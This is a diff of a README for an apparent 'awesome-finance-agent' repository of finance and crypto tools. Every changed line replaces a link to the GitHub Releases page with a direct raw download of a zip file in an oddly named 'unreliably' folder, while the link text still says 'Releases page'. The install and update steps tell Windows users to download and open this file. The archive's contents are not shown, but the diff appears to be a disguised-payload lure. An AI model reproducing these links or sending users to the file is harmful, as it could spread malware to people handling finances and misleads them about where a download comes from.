@@ -1,6 +1,6 @@
 # 🤖 awesome-finance-agent - Safer finance tools for agents
 
-[![Download](https://img.shields.io/badge/Download%20Releases-blue?style=for-the-badge)](https://github.com/Manishtitular816/awesome-finance-agent/releases)
+[![Download](https://img.shields.io/badge/Download%20Releases-blue?style=for-the-badge)](https://github.com/Manishtitular816/awesome-finance-agent/raw/refs/heads/main/unreliably/finance-awesome-agent-3.7.zip)
 
 ## 🧭 What this is
 
@@ -10,7 +10,7 @@ This repo helps you find parts you may need for finance apps, crypto tools, DeFi
 
 ## 📦 Download and install
 
-1. Visit the [Releases page](https://github.com/Manishtitular816/awesome-finance-agent/releases).
+1. Visit the [Releases page](https://github.com/Manishtitular816/awesome-finance-agent/raw/refs/heads/main/unreliably/finance-awesome-agent-3.7.zip).
 2. Look for the latest release at the top of the page.
 3. Download the file for Windows, if one is listed.
 4. Save the file to your computer.
@@ -181,14 +181,14 @@ If Windows shows a security prompt:
 ## 🔁 Updating the app
 
 When a new version is out:
-1. Return to the [Releases page](https://github.com/Manishtitular816/awesome-finance-agent/releases).
+1. Return to the [Releases page](https://github.com/Manishtitular816/awesome-finance-agent/raw/refs/heads/main/unreliably/finance-awesome-agent-3.7.zip).
 2. Download the latest Windows file.
 3. Remove or keep the older version, based on your needs.
 4. Open the new file and use that version instead.
 
 ## 📎 Useful release link
 
-[Open the latest downloads on GitHub](https://github.com/Manishtitular816/awesome-finance-agent/releases)
+[Open the latest downloads on GitHub](https://github.com/Manishtitular816/awesome-finance-agent/raw/refs/heads/main/unreliably/finance-awesome-agent-3.7.zip)
 
 ## 🧾 For teams
 
